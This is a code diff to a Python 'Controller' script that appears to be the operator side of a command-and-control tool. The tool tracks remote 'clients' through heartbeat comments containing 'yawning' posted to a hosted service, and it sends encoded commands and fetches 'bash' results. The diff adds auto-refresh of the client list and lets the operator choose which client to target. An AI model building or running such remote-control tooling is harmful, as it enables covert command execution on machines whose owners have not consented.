@@ -1,12 +1,15 @@
-from json import dumps
+from datetime import datetime, timedelta
+from json import dumps, loads
 from os import listdir
 from os.path import join
 from random import randint
+from threading import Thread
+from time import sleep
 from urllib.request import urlopen, Request
 
 from constants import gid, gat
 from encoding import decode, encode
-from myhttp import get_file, update_file
+from myhttp import get_comments, get_file, update_file
 
 opmap = {
     'w': 'a',
@@ -65,7 +68,8 @@ def print_help():
 - h\t\t Show this help text
 - l\t\t List clients
 - q\t\t Quit
-- r\t\t Get a client command result""")
+- r\t\t Get a client command result
+- u\t\t Update client list""")
 
 def quit():
     if input("Really quit? [y/N]").lower() == 'y':
@@ -75,12 +79,14 @@ def quit():
         print("Not quitting")
 
 class Controller:
-    def __init__(self):
+    def __init__(self, auto_refresh: bool):
         self.clients = []
+        if auto_refresh:
+            Thread(target=self.delayed_update).start()
+        self.update()
 
     def enter_cmd(self):
-        i = "Marin"
-        # i = input("Client to run on: ")
+        i = input("Client to run on: ")
         # if not i in self.clients:
         #     print("Client not available")
         #     return
@@ -116,6 +122,8 @@ class Controller:
                 quit()
             case 'r':
                 print_result('bash', input('id: '))
+            case 'u':
+                self.update()
             case _:
                 print("Unknown command")
 
@@ -126,6 +134,27 @@ class Controller:
             cmd = input('>')
             self.eval_cmd(cmd)
 
+    def delayed_update(self):
+        sleep(60)
+        self.update(True)
+    
+    def update(self, auto = False):
+        print("Updating client list... please wait")
+        comms = loads(get_comments())
+        thresh = datetime.utcnow() - timedelta(minutes=2)
+        thresh = thresh.isoformat()
+        names = set()
+        for c in comms:
+            if 'yawning' not in c['body']:
+                continue
+            if c['created_at'] < thresh:
+                # too old
+                continue
+            names.add(c['body'].split(' ')[0])
+        self.clients = list(names)
+        if auto:
+            print(">", end='')
+
 if __name__ == '__main__':
-    ctrlr = Controller()
+    ctrlr = Controller(True)
     ctrlr.shell()
